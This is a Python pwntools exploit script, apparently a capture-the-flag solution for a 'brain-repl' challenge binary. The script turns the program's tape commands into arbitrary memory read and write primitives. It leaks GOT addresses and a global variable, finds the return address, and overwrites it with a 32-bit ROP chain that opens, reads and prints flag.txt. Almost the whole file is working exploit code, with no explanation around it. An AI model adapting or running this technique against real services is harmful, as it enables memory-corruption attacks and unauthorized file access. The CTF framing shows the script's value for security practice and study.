#!/usr/bin/python

import argparse
import binascii

from pwn import *
context(arch='i386', os='linux')


CHUNK_SZ = 4


class BrainRepl(object):
    """Understands brain-repl state and can be sent commands"""
    def __init__(self, r, start_addr):
        self.r = r
        self.curr_addr = start_addr
        self.start_addr = start_addr
        print self.get_prompt()

    def get_prompt(self):
        """Get brain-repl prompt"""
        return self.r.recvpred(lambda x: x.endswith('> '))

    def do_R(self):
        """Read 4 bytes from tape_ptr"""
        self.r.sendline('R')
        return binascii.unhexlify(self.get_prompt().split()[0])

    def do_W(self, buf):
        """Write a 4-byte buffer to the current location of tape_ptr"""
        if len(buf) != CHUNK_SZ:
            raise Exception('len(buf) != CHUNK_SZ')

        self.r.sendline('W')
        self.r.sendline(buf)
        self.get_prompt()

    def do_scroll_left(self):
        """Decrement tape_ptr"""
        self.r.sendline('<')
        #print '<=='
        self.curr_addr -= 1
        self.get_prompt()

    def do_scroll_right(self):
        """Increment tape_ptr"""
        self.r.sendline('>')
        #print '==>'
        self.curr_addr += 1
        self.get_prompt()

    def seek(self, addr):
        """
        Send the appropriate scroll commands to set tape_ptr to the desired
        address,
        """
        while self.curr_addr != addr:
            if self.curr_addr < addr:
                self.do_scroll_right()
            else:
                self.do_scroll_left()

    def write_mem(self, addr, buf):
        """Write buf to arbitrary address"""
        print 'writing %s at 0x%x' % (binascii.hexlify(buf), addr)
        num_bytes = len(buf)
        leftover = num_bytes % CHUNK_SZ
        for i in xrange(0, num_bytes - leftover, CHUNK_SZ):
            print 'Seeking to 0x%x' % (addr + i)
            self.seek(addr + i)
            self.do_W(buf[i:i + CHUNK_SZ])

        if leftover != 0:
            #raise Exception('debug me')
            seek_addr = addr + num_bytes - CHUNK_SZ
            self.seek(seek_addr)
            leftover_bytes = self.do_W(buf[-CHUNK_SZ:])

        print 'done writing'

    def leak_mem(self, addr, num_bytes):
        """
        Leak an arbitrary number of bytes from an address, returning the leaked
        bytes.
        """
        if num_bytes <= 0:
            raise Exception('num_bytes must be > =')

        ans = [] 
        #print 'leaking %d bytes at  addr 0x%x' % (num_bytes, addr)
        leftover = num_bytes % CHUNK_SZ
        #print '  leftover: %d' % leftover
        for i in xrange(addr, addr + num_bytes - leftover, CHUNK_SZ):
            #print '  seeking to %x' % i
            self.seek(i)
            chunk = self.do_R()
            #print '  chunk: %s' % binascii.hexlify(chunk)
            ans.append(chunk)

        if leftover != 0:
            seek_addr = addr + num_bytes - CHUNK_SZ
            print '  seeking to %x' % seek_addr
            self.seek(seek_addr)
            leftover_bytes = self.do_R()[-leftover:]
            print '  leftover_bytes: %s' % binascii.hexlify(leftover_bytes)
            ans.append(leftover_bytes)

        return ''.join(ans)[:num_bytes]
    
    def leak_word(self, addr):
        """Leak a word from an address, returning an int"""
        return u32(self.leak_mem(addr, 4))

    def write_word(self, addr, word_val):
        """Write a word to an address"""
        self.write_mem(addr, p32(word_val))


def exploit(host, port, brain_elf_filename):
    """Perform exploit"""

    brain_elf = ELF(brain_elf_filename)
    r = remote(host, port)

    br = BrainRepl(r, brain_elf.symbols['tape'])

    def p_addr():
        print 'curr_addr: 0x%x' % br.curr_addr

    # Calculate the tape/tape_ptr addresses
    tape_ptr = br.leak_word(brain_elf.symbols['tape_ptr'])
    tape = tape_ptr + (brain_elf.symbols['tape'] - brain_elf.symbols['tape_ptr'])
    print 'tape_ptr: 0x%x' % tape_ptr
    print 'tape: 0x%x' % tape

    # Leak values from GOT
    open_loc = br.leak_word(brain_elf.got['open'])
    read_loc = br.leak_word(brain_elf.got['read'])
    write_loc = br.leak_word(brain_elf.got['write'])
    exit_loc = br.leak_word(brain_elf.got['exit'])
    print 'open: 0x%x' % open_loc
    print 'read: 0x%x' % read_loc
    print 'write: 0x%x' % write_loc
    print 'exit: 0x%x' % exit_loc

    # Leak cmd global variable
    cmd_loc = br.leak_word(brain_elf.symbols['cmd'])
    print 'cmd_loc: 0x%x' % cmd_loc

    # Calculate pwn return address location
    pwn_ret_address_cmd_offset = 13  ### MAGIC offset computed from examining in GDB
    pwn_ret = cmd_loc + pwn_ret_address_cmd_offset
    print 'pwn_ret: 0x%x' % pwn_ret

    # Payload:
    # open("flag.txt", 0, 0) = 4
    # read(4, buf, 50)
    # write(1, buf, 50)

    # Write flag filename to tape (remember to NUL terminate C-style string)
    filename = 'flag.txt\x00'
    filename_loc = tape
    br.write_mem(brain_elf.symbols['tape'], filename)
    buf_loc = tape + len(filename)
    bufsize = 60

    # "Jump" to pwn return address location by overwriting tape_ptr
    br.write_word(brain_elf.symbols['tape_ptr'], pwn_ret)
    br.curr_addr = pwn_ret  # Manually update curr_addr member

    # Leak the old/original value of the return address
    old_pwn_ret = br.leak_word(pwn_ret)
    print 'old_pwn_ret: 0x%x' % old_pwn_ret

    # Compute the address of our pop4ret
    ### MAGIC offset computed in GDB and using `ropgadget` and `distance`
    ### PEDA commands
    old_pwn_ret_pop4ret_offset = 688
    pop4ret = old_pwn_ret + old_pwn_ret_pop4ret_offset
    print 'pop4ret: 0x%x' % pop4ret

    # Test to make sure we overwrite return address (should crash)
    # br.write_word(pwn_ret, 0x4142434)

    # Create ROP payload array
    rop_payload = [
        # open(filename, 0, 0)
        open_loc,
        pop4ret,
        filename_loc,
        0,  # RD_ONLY
        0,
        0,

        read_loc,
        pop4ret,
        4,
        buf_loc,
        bufsize,
        0,

        write_loc,
        exit_loc,
        1,
        buf_loc,
        bufsize,
    ]

    # Write ROP payload to memory, starting at return address
    rop_payload_bytes = ''.join(p32(x) for x in rop_payload)
    br.write_mem(pwn_ret, rop_payload_bytes)

    # Cause return (which will cause our payload to execute) by sending an
    # invalid command
    r.sendline('?')

    # Print returned data
    #
    # I use this construction instead of recvall() so that we get incremental
    # results, instead of only getting them after an EOF. This is useful when we
    # are testing by pwning in GDB, which may have a breakpoint after the flag.
    # The flag would be delayed until we quit GDB.
    #
    # Reference:
    # https://binjitsu.readthedocs.io/tubes.html#pwnlib.tubes.tube.tube.recvall
    print 'Flag: '
    try:
        while True:
            print repr(r.recvline().strip().strip('\x00'))
    except EOFError:
        pass
    # '\n'.join(repr(x) for x in r.recvall().strip('\x00\n').split('\n'))
    r.close()


def main():
    parser = argparse.ArgumentParser(description='pwn brain-repl')
    parser.add_argument('--host', default='localhost')
    parser.add_argument('--port', type=int, default=2600)
    parser.add_argument('--elf', default='brain-repl')
    parser.add_argument('-d', '--debug', action='store_true', default=False)
    args = parser.parse_args()

    if args.debug:
        context.log_level = 'debug'

    exploit(args.host, args.port, args.elf)


if __name__ == '__main__':
    main()
